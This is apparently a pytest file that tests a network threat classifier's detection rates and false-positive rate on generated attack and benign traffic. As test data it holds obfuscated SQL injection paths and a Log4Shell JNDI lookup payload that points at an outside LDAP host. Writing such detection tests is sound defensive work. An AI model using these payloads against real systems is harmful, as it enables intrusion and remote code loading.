import pytest

from neurawall.core.models import AnomalyScore, ThreatLabel
from neurawall.modules.flow_collector.generator import TrafficGenerator
from neurawall.modules.l7_classifier import L7Classifier, needs_tier3
from tests.conftest import make_flow

EXPECTED = {
    "sql_injection": {ThreatLabel.SQL_INJECTION},
    "command_injection": {ThreatLabel.COMMAND_INJECTION, ThreatLabel.PATH_TRAVERSAL,
                          ThreatLabel.TEMPLATE_INJECTION},
    "dga": {ThreatLabel.DGA},
    "dns_tunnel": {ThreatLabel.DNS_TUNNEL},
    "c2_beacon": {ThreatLabel.C2_BEACON},
    "exfiltration": {ThreatLabel.EXFILTRATION},
    "tls_mismatch": {ThreatLabel.TLS_MISMATCH},
}


def top_malicious(cs):
    return {c.label for c in cs if c.label != ThreatLabel.BENIGN and c.confidence >= 0.7}


@pytest.mark.parametrize("scenario", sorted(EXPECTED))
def test_detection_rate_per_scenario(scenario):
    gen = TrafficGenerator(seed=21)
    clf = L7Classifier()
    flows = gen.scenario(scenario, 40)
    hits = sum(bool(top_malicious(clf.classify(f)) & EXPECTED[scenario]) for f in flows)
    assert hits / len(flows) >= 0.9, (scenario, hits, len(flows))


def test_benign_false_positive_rate():
    gen = TrafficGenerator(seed=22)
    clf = L7Classifier(rate_per_second=1e6)
    flows = [gen.benign() for _ in range(3000)]
    fps = [f for f in flows if top_malicious(clf.classify(f))]
    assert len(fps) / len(flows) < 0.001, [f.l7 for f in fps[:3]]


@pytest.mark.parametrize("path", [
    "/p?id=1%2527%2520OR%25201%253D1--",          # double URL-encoded
    "/p?id=1/**/UNION/**/SELECT/**/pass/**/FROM/**/users",  # comment obfuscation
    "/p?id=1 UnIoN aLl SeLeCt null,null--",           # case mixing
])
def test_injection_evasion_variants(path):
    f = make_flow(http={"path": path, "user_agent": "Mozilla/5.0"})
    assert ThreatLabel.SQL_INJECTION in {c.label for c in L7Classifier().classify(f)}


def test_log4shell_template():
    f = make_flow(http={"path": "/?x=${jndi:ldap://198.51.100.1/a}"})
    labels = top_malicious(L7Classifier().classify(f))
    assert ThreatLabel.TEMPLATE_INJECTION in labels


def test_novel_when_tier1_confident_but_unexplained():
    f = make_flow()
    out = L7Classifier().classify(f, AnomalyScore(flow_id=f.flow_id, score=0.95, confidence=1.0))
    assert out[0].label == ThreatLabel.NOVEL
    assert needs_tier3(out, 0.4, 0.7)


def test_rate_limiting_sheds_load():
    clf = L7Classifier(rate_per_second=1)
    f = make_flow()
    results = [clf.classify(f) for _ in range(10)]
    assert sum(1 for r in results if not r) >= 7


def test_attributions_present_and_bounded():
    gen = TrafficGenerator(seed=2)
    for c in L7Classifier().classify(gen.scenario("sql_injection", 1)[0]):
        if c.label != ThreatLabel.BENIGN:
            assert c.attributions and len(c.attributions) <= 8
